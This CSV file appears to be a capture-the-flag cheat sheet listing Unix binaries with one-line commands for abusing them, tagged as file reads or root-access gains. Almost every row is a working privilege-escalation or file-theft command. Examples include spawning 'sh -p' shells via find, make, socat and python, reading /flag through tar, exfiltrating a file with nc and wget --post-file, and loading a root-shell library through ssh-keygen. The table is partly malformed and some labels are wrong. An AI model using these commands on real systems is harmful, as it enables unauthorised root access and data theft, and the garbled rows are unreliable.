id,name,cmd,type,,
1,cat,cat '$FILE',File Read,,
2,more,more '$FILE',File Read,,
3,less,less '$FILE',File Read,,
4,tail,tail '$FILE',File Read,,
5,head ,head '$FILE',File Read,,
6,sort  ,sort -m  '$FILE',File Read,,
7,vim.basic,vim  '$FILE',File Read,, 
8,vim,vim  '$FILE',File Read,,
9,emacs-gtk,emacs  '$FILE',File Read,,
10,emacs ,emacs  '$FILE',File Read,,
11,nano,nano '$FILE',File Read,,
12,rev,rev '$FILE' | rev,File Read,,
13,od,od -An -c -w999 '$FILE',File Read,,
14,hexdump,hd '$FILE',File Read,,
15,hd,hd '$FILE',File Read,,
16,xxd,xxd '$FILE'| xxd -r,File Read,,
17,base32,base32 '$FILE' | base32  -d,File Read,,
18,base64,base64 '$FILE' | base64 -d,File Read,,
19,split,split '$FILE' pwnout;cat pwnoutaa; rm pwnoutaa -f,File Read,,
20,gzip,gzip -f '$FILE' -t,File Read,,
21,bzip2, bzip2 -c '$FILE' | bzip2 -d,File Read,,
22,zip ,zip pwnout.zip '$FILE';unzip -p pwnout.zip;rm -f pwnout.zip,File Read,,
23,tar,tar -c '$FILE'  | tar -xO;tar xf /flag -I '/bin/sh -c 'cat 1>&2'',File Read,,
24,ar ,ar r '$FILE.ar' '$FILE';ar p '$FILE.ar',File Read,,
25,cpio,echo '$FILE' |cpio -o,File Read,,
26,genisoimage,genisoimage -sort '$FILE',File Read,,
27,env,env sh -p,Gain Root Access,,
28,find ,find . -exec /bin/sh -p \ ; -quit,Gain Root Access,,
29,make,COMMAND='/bin/sh -p';./make -s --eval=$'x:\n\t-''$COMMAND',Gain Root Access,,
30,nice ,nice sh -p,Gain Root Access,,
31,timeout,timeout 7d sh -p,Gain Root Access,,
32,stdbuf,stdbuf -i0 /bin/sh,Gain Root Access,,
33,setarch,setarch $(arch) /bin/sh -p,Gain Root Access,,
34,watch,watch -x cat '$FILE';watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0',Gain Root Access,,
35,socat,socat stdin exec:'sh -p',Gain Root Access,,
36,whiptail,whiptail --textbox --scrolltext '$LFILE' 10 100,Gain Root Access,,
37,awk ,awk -v LFILE=$LFILE 'BEGIN { print 'DATA' > LFILE }',File Read,,
38,sed,sed -e '' '$LFILE',File Read,,
39,ed,ed '$FILE',File Read,,
40,chown,chown $(id -un):$(id -gn) $LFILE,File Read,,
41,chmod,chmod 6777 $LFILE,File Read,,
42,cp ,cp '$LFILE' /dev/stdout;cp  --no-preserve=mode,ownership  '$FILE' 'fileout',read file ,
43,mv,LFILE=file_to_write;TF=$(mktemp);echo 'DATA' > $TF;mv $TF $LFILE,read file and gain root access,,
44,,mv /bin/sh /bin/mv ;mv -p,,,
45,perl,perl -e 'exec '/bin/sh';',read file ,,
46,python,python -c 'import os; os.execl('/bin/sh', 'sh', '-p')',gain root access
47,bash,bash -p ,gain root access,,
48,date,date -f '$FILE',File Read,,
49,dmesg,dmesg -F '$FILE',File Read,,
50,wc,./wc --files0-from '$FILE',File Read,,
51,gcc,gcc -x c '$FILE',File Read,,
52,as ,as '$FILE',File Read,,
53,wget,TF=$(mktemp);chmod +x $TF;echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF;wget --use-askpass=$TF 0,Gain Root Access,,
54,,nc -l 1234   // terminal 1;wget --post-file='$FILE'  //terminal 2,File Read,,
55,ssh-keygen,cat '#include <unistd.h>,,,
void C_GetFunctionList(),,,,,
{,,,,,
  char *binaryPath = '/usr/bin/bash';,,,,,
  char *args[] = {binaryPath,'-p', NULL};,,,
  execv(binaryPath, args);,,,,
  return ;,,,,,
}'  > file.c,,,,,
$ gcc -c -Wall -Werror -fpic file.c,,,,,
gcc -shared -o file.so file.o,,,,,
ssh-keygen -D ./file.so,gain root access,,,,
